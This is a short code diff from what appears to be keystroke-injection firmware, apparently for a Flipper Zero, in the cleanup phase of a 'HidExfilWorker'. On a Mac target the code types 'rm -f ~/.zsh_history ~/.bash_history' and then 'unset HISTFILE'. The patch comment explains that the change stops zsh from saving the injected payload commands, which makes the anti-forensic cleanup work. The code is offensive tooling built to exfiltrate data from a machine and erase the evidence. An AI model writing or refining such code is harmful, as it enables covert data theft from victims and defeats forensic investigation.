@@ -505,11 +505,15 @@ static void phase_cleanup(HidExfilWorker* worker) {
         break;
 
     case TargetOSMac:
-        /* Clear zsh history and close */
+        /* Clear zsh history and close.
+         * `history -p` is csh/tcsh only — it does nothing in zsh (macOS
+         * default since Catalina).  Without `unset HISTFILE`, zsh writes
+         * the in-memory history (including payload commands) to a new
+         * ~/.zsh_history on exit, defeating the cleanup. */
         furi_delay_ms(300);
         type_string("rm -f ~/.zsh_history ~/.bash_history\r\n", delay, worker);
         furi_delay_ms(200);
-        type_string("history -p\r\n", delay, worker);
+        type_string("unset HISTFILE\r\n", delay, worker);
         furi_delay_ms(200);
         type_string("exit\r\n", delay, worker);
         break;
